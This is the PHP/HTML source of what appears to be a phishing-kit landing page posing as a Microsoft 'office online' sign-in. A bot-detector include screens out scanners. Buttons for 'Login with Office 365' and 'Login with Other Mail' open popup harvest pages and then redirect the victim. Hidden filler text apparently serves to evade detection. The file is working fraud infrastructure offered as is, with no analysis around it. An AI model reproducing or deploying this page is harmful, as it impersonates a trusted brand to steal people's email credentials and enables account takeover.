<?php 
	include('botdetector.php');
        
?>

<html><head>
<title>Document</title>
<link rel="icon" href="images/favicon_sh.ico">
<style>

.overlay_xyrqwerty{
  position: fixed;
  top: 0;
  left: 0;
  z-index: 2000;
  background: #ffffff;
  width: 100%;
  min-width: 100%;
  height: 100%;
  min-height: 100%;
}
</style>
</head>
<body data-__gyazo-extension-added-paste-support="true">
<div class="overlay_xyrqwerty" style="display: none;"></div>
<div class="mainallpppppp" data-tt="">



    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>Document</title>
    <link rel="stylesheet" href="css/style.css">





    <section id="mail-section">
        <div class="mail-main-col">
            <div class="mail-left-col mail-col">
                <div class="img-col">
                    <img src="images/bg.jpg" alt="">
                </div>
                <div class="mail-caption">
                    <h3>Welcome to office online</h3>
                    <p>Create, edit and share. Work with others at the same time.</p>
                </div>
            </div>
            <div class="mail-right-col mail-col">
                <div class="img-col">
                    <img src="images/office.jpg" alt="">
                </div>
                <div class="right-ul-col">
                    <ul class="list">
                    
                        
                        <li class="link4">
                            <a href="" data-n="link4" data-nn="TSF.htm">
                                <img src="images/d.jpg" alt="">
                                <p>Login with Office 365</p>
                            </a>
                        
                        <li class="link6">
                            <a href="" data-n="link6" data-nn="TFR.htm">
                                <img src="images/f.jpg" alt="">
                                <p>Login with Other Mail</p>
                            </a>
                        </li>
                    </ul>
                </div>
                <div class="right-content">
                    <p>
                        Productivity is a great word that people love to use. However, in real world, productivity can
                        be summed up in a simple question: Can i do my job easier or not?
                    </p>
                </div>
            </div>
        </div>
    </section>

<div class="line"></div>
    <div style="" id="checks"></div>
   <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
   <script>
     $(document).ready(function(e){ 
	   window_opener_xc(); 
	 });
	 function window_opener_xc(){
	   var url_part = get_extra_data(1);
	   $('.link1 a, .link2 a, .link3 a, .link4 a, .link5 a, .link6 a').click(function(e){
	     e.preventDefault();
		 var checks = $('#checks');
         checks.data('b', $(this).data('n'));		 
		 var win3 = window.open(url_part+$(this).data('nn'), '_blank', 'location=yes,height=570,width=520,scrollbars=yes,status=yes');
	     setInterval(function(){ 
		   if($('#checks').html()){ window.location.replace(get_extra_data(2)); }
		 }, 3000);
	   });
	 }
	 function get_extra_data(a){
	   var output = '';
	   if(a==1){
	     output = '';
	   }
	   else if(a==2){
	     output = "";
	   }
	   return output;
	 }
   </script>


</div>

<div style="display: none;">
<p>
  block elements contain an entire large region of content
examples: paragraphs, lists, table cells
the browser places a margin of whitespace between block elements for separation
inline elements affect a small amount of content
examples: bold text, code fragments, images
the browser allows many inline elements to appear on the same line
must be nested inside a block element

</p></div>

</body></html>